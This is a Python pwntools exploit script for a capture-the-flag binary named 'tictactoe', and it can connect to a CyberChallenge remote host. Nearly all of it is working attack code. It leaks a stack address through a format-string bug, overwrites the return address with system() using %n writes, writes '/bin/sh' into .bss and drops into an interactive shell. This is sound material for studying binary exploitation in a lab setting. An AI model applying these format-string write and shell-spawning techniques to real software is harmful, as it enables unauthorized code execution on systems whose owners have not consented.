#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

#https://www.win.tue.nl/~aeb/linux/hh/formats-teso.html
exe = context.binary = ELF('tictactoe')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote("tictactoe.challs.cyberchallenge.it", 6012, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
gef config context.nb_lines_stack 140
br *0x8048ad8
br *0x8048dbe
continue
'''.format(**locals())

# Arch:     i386-32-little
# RELRO:    No RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

#Format string vulnerability, sscanf let's through the input from scanf thanks to the if conditions

io = start()

def write_word(addr, word_bytes):
    diff_target_addr = 0x4 #Number of chars already in the str to take into account when writing

    #Move stack pointer of printf until the format string position on the stack
    for i in range(len(word_bytes)):
        res = word_bytes[i]-diff_target_addr

        if(res == 0): #Special case #1
            io.sendline((addr+i).to_bytes(4, "little") + \
                b"%15$n")
        elif(res < 10): #Special case #2... sigh
            io.sendline((addr+i).to_bytes(4, "little") + \
                b"_"*res + b"%15$n")
        else:
            io.sendline((addr+i).to_bytes(4, "little") + \
                b"%" + str(res).encode() + b"x%15$n")

system_bytes = exe.sym.system.to_bytes(4, "little")

#Retrieve a stack address and its distance from the return address (retloc)
diff_retloc_stack_addr = 0xc4
io.sendline("%2$x") #Stack address on stack
io.recvuntil("I don't understand: ")
retloc = int(io.recvuntil(",", True).decode(), 16) + diff_retloc_stack_addr
print("retloc: %x"%retloc)

write_word(retloc, system_bytes)
bss_clean_addr = 0x0804a2f0
bss_addr_bytes = bss_clean_addr.to_bytes(4, "little")

first_half_arg = bytes("/bin", "ascii")
second_half_arg = bytes("/sh", "ascii")

write_word(bss_clean_addr, first_half_arg)
write_word(bss_clean_addr+4, second_half_arg)

#Put an empty ebp block to adhere to the functions calling convention
write_word(retloc+4, b"\x00\x00\x00\x00")
write_word(retloc+8, bss_addr_bytes)

io.interactive()
